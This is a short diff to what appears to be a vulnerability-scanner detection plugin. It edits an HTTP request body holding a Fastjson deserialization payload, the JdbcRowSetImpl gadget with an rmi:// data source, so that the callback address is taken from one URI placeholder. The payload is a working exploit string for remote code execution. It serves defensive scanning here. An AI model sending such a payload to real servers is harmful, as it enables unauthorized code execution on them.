@@ -41,7 +41,7 @@ actions: {
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
-    data: "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{{ T_CBS_ADDRESS }}:{{ T_CBS_PORT }}/NoObjectHere\",\"autoCommit\":true}}"
+    data: "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{{ T_CBS_URI }}/NoObjectHere\",\"autoCommit\":true}}"
     client_options: {
       disable_follow_redirects: true
       ignore_http_client_errors: true
